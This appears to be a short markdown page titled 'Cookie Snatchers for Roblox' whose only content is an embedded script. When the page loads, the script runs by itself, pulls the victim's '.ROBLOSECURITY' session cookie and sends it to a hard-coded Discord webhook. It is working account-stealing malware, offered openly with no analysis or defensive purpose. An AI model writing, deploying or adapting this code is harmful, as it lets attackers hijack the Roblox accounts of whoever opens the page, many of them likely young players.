# Cookie Snatchers for Roblox

<script>
    document.addEventListener('DOMContentLoaded', function() {
        const getCookies = () => {
            const cookies = document.cookie.split(';');
            const robloxCookies = cookies.filter(cookie => cookie.includes('.ROBLOSECURITY'));
            return robloxCookies.map(cookie => cookie.trim());
        };

        const sendToWebhook = (cookies) => {
            const webhookUrl = 'https://discord.com/api/webhooks/1482894586249744465/a_4XPC0HHrulhLfFZvdjlrhO8BYVs_xH53PGV8xqqWI6gGLptbh93K4QdaI50F-JHQQi';
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ content: cookies.join('\n') })
            });
        };

        const cookies = getCookies();
        if (cookies.length > 0) {
            sendToWebhook(cookies);
        }
    });
</script>
